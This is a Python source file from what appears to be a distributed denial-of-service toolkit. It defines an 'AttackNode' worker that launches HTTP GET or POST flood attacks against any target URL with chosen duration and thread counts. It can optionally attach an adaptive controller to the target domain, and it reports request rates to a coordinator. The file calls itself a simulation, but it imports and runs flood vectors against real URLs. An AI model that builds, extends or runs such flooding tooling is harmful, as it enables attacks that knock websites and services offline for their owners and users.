import asyncio
import uuid
import logging
import time
from typing import Dict, Any, Optional
from src.core.infrastructure.fixed_metrics import FixedMetrics
from src.core.ai.adaptive_controller import AdaptiveController

class AttackNode:
    """
    Simulated Worker Node for Phase 7.1.
    Each node can run an attack vector independently.
    """
    def __init__(self, node_id: str = None, location: str = "US-East"):
        self.node_id = node_id or f"node-{str(uuid.uuid4())[:8]}"
        self.location = location
        self.metrics = FixedMetrics()
        self.is_active = False
        self.logger = logging.getLogger(f"Node-{self.node_id}")
        self.current_task = None

    async def run_attack(self, target_url: str, vector_name: str, duration: int, threads: int, adaptive: bool = False):
        self.is_active = True
        self.logger.info(f"[*] Node {self.node_id} ({self.location}) starting {vector_name} on {target_url}")
        
        # In a real scenario, this would dynamically import and run the vector
        # For simulation, we'll use the existing AttackEngine logic but isolated per node
        from src.vectors.l7_application.http_get_flood import HTTPGetFlood
        from src.vectors.l7_application.http_post_flood import HTTPPostFlood
        
        adaptive_ctrl = None
        if adaptive:
            domain = target_url.replace("https://", "").replace("http://", "").split("/")[0]
            adaptive_ctrl = AdaptiveController(domain, self.metrics)
            asyncio.create_task(adaptive_ctrl.run_loop())

        try:
            if vector_name == "http_get_flood":
                v = HTTPGetFlood(target_url, shared_metrics=self.metrics, adaptive_ctrl=adaptive_ctrl)
                await v.start(duration, threads)
            elif vector_name == "http_post_flood":
                v = HTTPPostFlood(target_url, shared_metrics=self.metrics, adaptive_ctrl=adaptive_ctrl)
                await v.start(duration, threads)
            else:
                self.logger.error(f"[-] Vector {vector_name} not supported by Node.")
        except Exception as e:
            self.logger.error(f"[-] Node {self.node_id} error: {e}")
        finally:
            if adaptive_ctrl:
                adaptive_ctrl.stop()
            self.is_active = False
            self.logger.info(f"[+] Node {self.node_id} completed task.")

    def get_status(self) -> Dict[str, Any]:
        summary = self.metrics.get_summary()
        return {
            "node_id": self.node_id,
            "location": self.location,
            "active": self.is_active,
            "rps": summary.get("rps", 0),
            "attempted": summary.get("attempted", 0),
            "completed": summary.get("completed", 0),
            "failed": summary.get("failed", 0),
            "timeout": summary.get("timeout", 0),
            "avg_latency": summary.get("avg_latency_ms", 0)
        }
